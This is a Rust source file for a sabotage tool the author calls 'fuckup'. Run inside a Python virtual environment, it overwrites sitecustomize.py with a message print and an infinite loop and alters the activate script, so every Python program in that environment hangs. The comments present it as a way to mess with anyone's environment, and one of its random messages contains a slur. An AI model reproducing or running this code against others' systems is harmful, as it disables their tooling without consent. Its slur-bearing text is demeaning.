
// Written on 2024/12/07 while listening to SLIDE by Kanye West
// https://youtu.be/IAh3r5egwzA?si=cPG3ev6RRQzGLj0Y


// Hijacks your python virtual environment rendering any other python code uninterpretable
// To mess with anyone's python virtual environment go to the directory where bin, lib are located
// and run 'fuckup'
// fuckup injects some code into your virtual environment config and does not respond to running any new python code
// Maybe I will write something to undo this process, although it is quite straightforward
// Should work fine on windows although, I did not test on it.

use std::io::Write;
use std::fs::{OpenOptions, File};
use rand::Rng;

fn main() -> std::io::Result<()> {

    let text: Vec<String> = vec![
        "occams razor is a good way of thinking of all sciences, except philosophy and human natu..".to_owned(),
        "most people are ret*rded and that is why we might need even more coll**ges in our coun..".to_owned(),
        "the dilemma of the human soul is hunting for peace but not being able to contend with it so we gene..".to_owned(),
        "fyodor mikhailovich dostoevsky is the greatest writer of all time and his book Crime and Punishment, The Idiot prov..".to_owned(),
        "nietzsche says, human is a tight rope over the line between animal and Ubermensch, strayed in the abys..".to_owned(),
        "the world needs transformation and radicalism but can not accept it as its divine truth and we theref..".to_owned(),
    ];

    let mut pickfrom = pick::new(text);

    fuckup(pickfrom)
}


#[derive(Debug)]
struct pick {
    list: Vec<String>,
    i: usize,
}

impl pick {
    
    fn new(list: Vec<String>) -> Self {

        let mut rng = rand::thread_rng();
        pick {
            list: list.clone(),
            i: rng.gen_range(0..list.len()),
        }
    } 

    fn pick(&mut self) -> String {
        
        self.i += 1;
        self.list[self.i % self.list.len()].clone()
    }
}

#[cfg(unix)]
fn fuckup(mut picks: pick) -> std::io::Result<()> {

    let dir = "lib/python3.11/site-packages";
    let site_customize = format!("{}/sitecustomize.py", dir);

    let mut file = OpenOptions::new()
        .create(true)
        .truncate(true)
        .write(true)
        .open(site_customize)?;

    writeln!(file, "print('\\x1b[31;1m{}\\x1b[0m')", picks.pick())?;
    writeln!(file, "while(True):\n\tpass")?;

    let activate = "bin/activate";

    let mut file = OpenOptions::new()
        .append(true)
        .open(activate)?;

    writeln!(file, r#"export PYTHONPATH="../lib/python3.11/site-packages:$PYTHONPATH""#)?;
    writeln!(file, "export PYTHONNOUSERSITE=1")?;

    Ok(())
}


#[cfg(windows)]
fn fuckup(mut picks: pick) -> std::io::Result<()> {

    let dir = "lib\\python3.11\\site-packages";
    let site_customize = format!("{}\\sitecustomize.py", dir);

    let mut file = OpenOptions::new()
        .create(true)
        .truncate(true)
        .write(true)
        .open(site_customize)?;

    writeln!(file, "print('\\x1b[32;1m{}\\x1b[0m')", picks.pick())?;
    writeln!(file, "while(True):\n\tpass")?;

    let activate = "Scripts\\activate";

    let mut file = OpenOptions::new()
        .append(true)
        .open(activate)?;

    writeln!(file, r#"set PYTHONPATH="..\lib\python3.11\site-packages;$PYTHONPATH""#)?;
    writeln!(file, "set PYTHONNOUSERSITE=1")?;

    Ok(())
}